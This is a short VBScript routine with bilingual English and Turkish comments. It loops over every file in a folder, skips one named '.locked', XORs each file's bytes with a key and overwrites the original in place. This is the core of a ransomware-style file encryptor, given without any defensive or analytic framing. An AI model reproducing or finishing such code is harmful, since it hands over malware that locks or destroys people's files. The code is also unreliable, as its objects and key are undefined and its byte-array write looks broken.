Sub ProcessFiles()
    Dim inputStream, outputStream, b, i, binaryData
    Set folder = fso.GetFolder(folderPath)
    
    For Each file In folder.Files
        If file.Name <> ".locked" Then
            Set inputStream = CreateObject("ADODB.Stream")
            inputStream.Type = 1 ' TypeBinary
            inputStream.Open
            inputStream.LoadFromFile file.Path
            binaryData = inputStream.Read
            inputStream.Close
            Set inputStream = Nothing

            ' XOR logic with byte array / XOR mantığı ve bayt dizisi
            Dim byteArr()
            ReDim byteArr(LenB(binaryData) - 1)
            For i = 0 To LenB(binaryData) - 1
                ' AscB and ChrB are key here for binary / İkilik işlemler için AscB ve ChrB kritik
                byteArr(i) = AscB(MidB(binaryData, i + 1, 1)) Xor key
            Next

            ' Write using Stream.Write with a proper byte array / Stream.Write ile yazma
            Set outputStream = CreateObject("ADODB.Stream")
            outputStream.Type = 1 ' TypeBinary
            outputStream.Open
            outputStream.Write byteArr
            outputStream.SaveToFile file.Path, 2 ' adSaveCreateOverWrite
            outputStream.Close
            Set outputStream = Nothing
        End If
    Next
End Sub
